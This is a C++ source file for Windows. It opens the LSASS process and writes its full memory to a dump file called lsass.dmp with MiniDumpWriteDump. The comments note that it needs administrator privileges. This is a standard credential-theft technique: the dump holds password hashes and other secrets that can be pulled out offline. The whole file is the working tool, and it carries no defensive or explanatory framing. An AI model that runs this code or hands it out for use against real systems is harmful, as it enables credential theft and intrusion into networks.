#include <iostream>
#include <windows.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

// Dumps the memory of the LSASS process to a file.
// Requires administrator privileges.

int main() {
    DWORD lsass_pid = 0;
    HANDLE lsass_handle = NULL;
    HANDLE outfile = NULL;

    // Find LSASS PID
    // This is a simplified example. A real tool would enumerate processes.
    // For testing, get the PID from Task Manager.
    std::cout << "Enter LSASS PID: ";
    std::cin >> lsass_pid;

    lsass_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (lsass_handle == NULL) {
        std::cerr << "Failed to open LSASS process." << std::endl;
        return 1;
    }

    outfile = CreateFile("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outfile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create output file." << std::endl;
        CloseHandle(lsass_handle);
        return 1;
    }

    if (MiniDumpWriteDump(lsass_handle, lsass_pid, outfile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        std::cout << "LSASS memory dumped successfully." << std::endl;
    } else {
        std::cerr << "Failed to dump LSASS memory." << std::endl;
    }

    CloseHandle(lsass_handle);
    CloseHandle(outfile);

    return 0;
}
